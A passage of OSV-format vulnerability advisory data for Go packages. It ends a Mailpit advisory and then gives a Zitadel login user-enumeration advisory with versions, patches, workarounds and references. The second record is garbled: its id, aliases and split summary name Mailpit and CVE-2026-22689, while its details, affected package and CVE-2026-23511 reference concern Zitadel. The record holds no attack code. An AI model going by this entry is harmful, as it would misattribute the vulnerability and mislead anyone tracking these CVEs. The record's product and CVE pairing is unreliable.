data.","affected":[{"package":{"name":"github.com/axllent/mailpit","ecosystem":"Go","purl":"pkg:golang/github.com/axllent/mailpit"},"ranges":[{"type":"SEMVER","events":[{"introduced":"1.2.6"},{"fixed":"1.28.2"}]}],"database_specific":{"source":"https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/01/GHSA-524m-q5m7-79mm/GHSA-524m-q5m7-79mm.json"}},{"package":{"name":"github.com/axllent/mailpit","ecosystem":"Go","purl":"pkg:golang/github.com/axllent/mailpit"},"ranges":[{"type":"SEMVER","events":[{"introduced":"0"},{"fixed":"0.0.0-20260110031614"}]}],"database_specific":{"source":"https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/01/GHSA-524m-q5m7-79mm/GHSA-524m-q5m7-79mm.json"}}],"references":[{"type":"WEB","url":"https://github.com/axllent/mailpit/security/advisories/GHSA-524m-q5m7-79mm"},{"type":"ADVISORY","url":"https://nvd.nist.gov/vuln/detail/CVE-2026-22689"},{"type":"WEB","url":"https://github.com/axllent/mailpit/commit/6f1f4f34c98989fd873261018fb73830b30aec3f"},{"type":"PACKAGE","url":"https://github.com/axllent/mailpit"}],"database_specific":{"cwe_ids":["CWE-1385"],"github_reviewed":true,"github_reviewed_at":"2026-01-13T15:11:42Z","nvd_published_at":"2026-01-10T06:15:51Z","severity":"MODERATE"},"severity":[{"type":"CVSS_V3","score":"CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N"}],"_metadata":{"fetched_at":"2026-01-27T01:17:40.294456Z","source":"go","ecosystem":"Go"}},{"schema_version":"1.7.3","id":"GO-2026-4310","published":"2026-01-23T02:28:11Z","modified":"2026-01-23T02:56:17.348206Z","aliases":["CVE-2026-22689","GHSA-524m-q5m7-79mm"],"summary":"Mailpit

has a user enumeration vulnerability in Login UIs","details":"### Summary\n\nA user enumeration vulnerability has been discovered in Zitadel's login interfaces. An unauthenticated attacker can exploit this flaw to confirm the existence of valid user accounts by iterating through usernames and userIDs.\n\n### Impact\n\nThe login UIs (in version 1 and 2) provide the possibility to request a password reset, where an email will be sent to the user with a link to a verification endpoint.\nBy submitting arbitrary userIDs to these endpoints, an attacker can differentiate between valid and invalid accounts based on the system's response.\n\nFor an effective exploit the attacker needs to iterate through the potential set of userIDs. The impact can be limited by implementing [rate limiting](https://zitadel.com/docs/self-hosting/manage/production#limits-and-quotas) or similar measures to limit enumeration of userIDs.\n\nAdditionally, Zitadel includes a security feature \"Ignoring unknown usernames\", designed to prevent username enumeration attacks by presenting a generic response for both valid and invalid usernames on the login page. The login UI V2 did not handle the setting correctly and would allow attackers to enumerate through usernames to check their existence.\n\n### Affected Versions\n\nAll versions within the following ranges, including release candidates (RCs), are affected:\n- **v4.x**: `4.0.0` through `4.9.0`\n- **3.x**: `3.0.0` through `3.4.5`\n- **2.x**: `2.0.0` through `2.71.19`\n\n### Patches\n\nThe vulnerability has been addressed in the latest releases. The patch resolves the issue by returning a generic error message, which does not indicate it the user exists.\n\n4.x: Upgrade to >=[4.9.1](https://github.com/zitadel/zitadel/releases/tag/v4.9.1)\n3.x: Update to >=[3.4.6](https://github.com/zitadel/zitadel/releases/tag/v3.4.6)\n2.x: Update to >=[3.4.6](https://github.com/zitadel/zitadel/releases/tag/v3.4.6)\n\n### Workarounds\n\nThe recommended solution is to update ZITADEL to a patched version. You can limit the impact by implementing [rate limiting](https://zitadel.com/docs/self-hosting/manage/production#limits-and-quotas) or similar measures to limit enumeration of userIDs.\n\nThere is no workaround for the \"Ignoring unknown usernames\" issue in login V2. Please upgrade to a patched version, if you rely on this feature.\n\n### Questions\n\nIf you have any questions or comments about this advisory, please email us at [security@zitadel.com](mailto:security@zitadel.com)\n\n### Credits\n\nThanks to Niklas Kunz from Seamly for reporting this vulnerability from their pentest.","affected":[{"package":{"name":"github.com/zitadel/zitadel","ecosystem":"Go","purl":"pkg:golang/github.com/zitadel/zitadel"},"ranges":[{"type":"SEMVER","events":[{"introduced":"4.0.0"},{"fixed":"4.9.1"}]}],"database_specific":{"last_known_affected_version_range":"<= 4.9.0","source":"https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/01/GHSA-pvm5-9frx-264r/GHSA-pvm5-9frx-264r.json"}},{"package":{"name":"github.com/zitadel/zitadel","ecosystem":"Go","purl":"pkg:golang/github.com/zitadel/zitadel"},"ranges":[{"type":"SEMVER","events":[{"introduced":"0"},{"fixed":"3.4.6"}]}],"database_specific":{"last_known_affected_version_range":"<= 3.4.5","source":"https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/01/GHSA-pvm5-9frx-264r/GHSA-pvm5-9frx-264r.json"}}],"references":[{"type":"WEB","url":"https://github.com/zitadel/zitadel/security/advisories/GHSA-pvm5-9frx-264r"},{"type":"ADVISORY","url":"https://nvd.nist.gov/vuln/detail/CVE-2026-23511"},{"type":"WEB","url":"https://github.com/zitadel/zitadel/commit/0bb00dd9fc4e5e965f8e14fa2161a5076f3c308d"},{"type":"WEB","url":"https://github.com/zitadel/zitadel/commit/b85ab69e4679b0268e2b0e9b4cd04e934af10dd2"},{"type":"WEB","url":"https://github.com/zitadel/zitadel/commit/c300d4cc6a2775ab17ddfe76492f24170f8b858d"},{"type":"PACKAGE","url":"https://github.com/zitadel/zitadel"},{"type":"WEB","url":"https://github.com/zitadel/zitadel/releases/tag/v3.4.6"},{"type":"WEB","url":"https://github.com/zitadel/zitadel/releases/tag/v4.9.1"}],"database_specific":{"cwe_ids":["CWE-203","CWE-204"],"github_reviewed":true,"github_reviewed_at":"2026-01-15T18:17:06Z","nvd_published_at":"2026-01-15T20:16:05Z","severity":"MODERATE"},"severity":[{"type":"CVSS_V3","score":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"}],"_metadata":{"fetched_at":"2026-01-27T01:17:40.398888Z","source":"go","ecosystem":"Go"}}]
